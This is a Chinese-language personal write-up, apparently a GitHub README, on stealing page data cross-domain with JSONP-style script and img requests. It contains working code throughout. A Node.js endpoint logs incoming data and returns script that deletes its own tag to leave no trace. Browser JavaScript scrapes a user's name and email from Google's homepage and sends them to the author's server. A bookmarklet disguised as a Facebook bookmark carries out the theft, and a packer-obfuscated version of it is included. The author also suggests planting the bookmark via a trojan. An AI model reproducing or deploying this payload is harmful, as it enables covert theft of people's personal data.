# JSONP-data-stealing
A try of XSS data stealing by JSONP

(個人紀錄用  可能有理解上的錯誤 對此有興趣的人也歡迎指教)

 前陣子看到了一篇利用JSONP進行XSS攻擊可能性的文章，突發奇想不知道是不是能用類似JSONP的方式，表面上是向跨網域的伺服器請求資料，其實是傳送資料給外部的伺服器。
 
(雖然覺得這種事情應該早就有人做過了XD)

以下是自己的紀錄

----
在html中大部分的東西都是不被允許跨網域存取的，只有&lt;img>&lt;script>,&lt;iframe>這幾個tag可以透過外連src跨網域的請求資料。而有了這點就代表也有機會在使用者端利用get的方式傳送資料給外部的伺服器。
舉個例子來說:

    <script src=’http://exampleHost/dataGet?data=myData’></script>

當這個tag被瀏覽器載入時會向exampleHost的dataGet頁面請求script ，而query的部分也會被以get的方式被伺服端取得，這也是JSONP的基礎精神，只要伺服器端支援JSONP就可以利用傳入的data和callback返還相對應的javascript並執行。

而如果myData的部分是透過javascript取得頁面上想要的資料再傳送時，不就等於將資料跨網域傳送給外部伺服器了嗎?

 有了想法，剛好最近又沉迷於node.js中，決定以node.js建立外部伺服器來試試看究竟可不可行。我在node.js的伺服器中寫了這樣的一個route(因為這邊的重點不是node.js的運作 所以不詳述node.js的部分):
 
      function dataGet(response,postdata,getdata,request) {      
     console.log(getdata);
      }  
      
這段程式碼做的事情很簡單，就只是將伺服器接到的getdata也就是query的部分印出。
接下來就是在寫一段要在瀏覽器端運行的javascript:
    
    var newScript= document.createElement('script');newScript.src='http://127.0.0.1:8888/dataGet?data=...'; 
    newScript.id='newScript';
    document.body.appendChild(newScript);

這段javascript做的事情是，在body中即時建立一個id為newScript新的script元件，並且將src設為自己的伺服器和路徑，這邊因為是自己在測試所以使用了localhost的127.0.0.1，至於為什麼要特地加上id後面會再詳述。

當兩端所需要的程式碼都準備好了，就是第一次測試的時候了。我一開始的目標是Facebook，結果發現在外部請求的script上Facebook不允許localhost的網域。

好樣的Facebook，記得前陣子看到通訊軟體的安全度Facebook Messenger是第一名，看來說不定Facebook在安全性的部分做了不少的用心。

<img src="http://i.imgur.com/ohO9kNH.jpg"></img>
*甚至提醒使用者不要在控制台貼上來路不明的Javascript 意外的用心*

儘管還是不能就這樣放棄，所以我又測試了img的tag，結果意外的成功了!!!

<img src="http://imgur.com/UjnqRgi.jpg"></img>
*伺服器端也成功地取得了資料*

由此可見，這個方法確實是可行的!

---

不過這跟我一開始的想法依然有點差距，所以我決定傳站其他的網頁試試，這次的目標是Google的搜尋首頁

<img src="http://imgur.com/INS0qvw.jpg"></img>

 噫！好了！我中了！ Google的搜尋首頁完全沒有阻擋外部javascript的載入，這樣就可以進一步來實行我原本的想法啦!!!
 
就像前面說的JSONP可以動態產生javascript讓網頁執行，我決定產生一段javascript讓他會刪除自己這個script的元件(也就是前面要設定id的原因)，以達到「不留痕跡」的地步。

    function dataGet(response,postdata,getdata,request) {
    console.log("Request handler 'dataGet' was called.");  
    console.log(getdata);  
    var responseScript="document.getElementById('newScript').remove();";  //刪除的script  
    response.write(responseScript);//傳出內容   response.end(); 
    }
  
  除此之外在瀏覽器端我也加了一點東西從搜尋的首頁撈點資料，這邊撈的是使用者設定的名字和他的信箱
  
      var name=document.getElementsByClassName("gb_ub")[0].innerHTML;
      var email=document.getElementsByClassName("gb_vb")[0].innerHTML;
      var newScript= document.createElement('script');newScript.src='http://127.0.0.1:8888/dataGet?name=..."&email="+email;  
      newScript.id='newScript';document.body.appendChild(newScript);
  
 如此一來就已經有個雛型了，測試一下也頗為成功。
 
 <img src="http://imgur.com/Nwlz6Vj.jpg"></img>
*在網頁元件中沒有看到新增的script元件 資料也有成功傳輸*

到了這裡，可能會發現要使用這個方法有一個大問題。那就是在執行的時候一定要在瀏覽器端輸入javascript。要怎樣在不被發現的情況下輸入確實是一個大問題，目前也只想到一個方法，不過覺得還不夠理想。

這個方法就是偽裝成其他網頁的瀏覽器書籤，現在的瀏覽器在沒有關閉功能的情況下大多都可以利用網址列執行javascript，而且也可以透過書籤執行，只要在網址的部分設定成以下的javascript即可:
    
    
    javascript:
    (
      function(){
       try{
          var name=document.getElementsByClassName("gb_ub")[0].innerHTML;
          var email=document.getElementsByClassName("gb_vb")[0].innerHTML;
          var newScript= document.createElement('script');
          newScript.src='http://127.0.0.1:8888/dataGet?name=..."&email="+email;newScript.id='newScript';
          document.body.appendChild(newScript);
          }
        catch(e){}
        window.location="http://www.facebook.com/";
       }
     )
     
     
 因為想要偽裝成Facebook的書籤列，在最後又加上了導向到Facebook的程式碼，如果覺得太明顯也可以透過javascript加密的方式將程式碼加密
 
     javascript:(eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+
       ((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);
       k=[function(e)    {return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'
       \\b','g'),k[c]);return p;}('b(){h{4 6=3.9("f")[0].7;4 5=3.9("g")[0].7;4 2=3.i(\'a\');2.d=\'8://c.0.0.1:j/q?6=\'+6+"&  5="+5;
       2.s=\'2\';3.p.r(2)}k(e) {} m.o="8://n.l.t"}',
       30,30,'||newScript|document|var|email|name|innerHTML|http|getElementsByClassName|script|function|127|src||gb 
       _ub|gb_vb|try|createElement|8888|catch|facebook|window|www|location|body|dataGet|appendChild|id|com'.split('|'),0,{})))


*透過此網站加密的結果: http://tool.chinaz.com/js.aspx*


如果是一個不知情的使用者他的Facebook書籤已經被替換掉(可能是透過木馬的方式置換)，而且正好從Google主頁要透過書籤前往Facebook時，就能從中竊取資料。
雖然這樣確實能達到效果，卻讓刪除元件的部分顯的多餘，方法本身也有些笨拙，不知道是不是還有更好的方法呢.....?

總結上這個方法應該還算是有趣，雖然在這只抓取了名字和e-mail，不過還能從使用者的網頁中挖出更多有用的資料這件事是無庸置疑的，只是為不為之的問題。

當然，這之間也還有很多限制跟問題是要解決跟改進的。
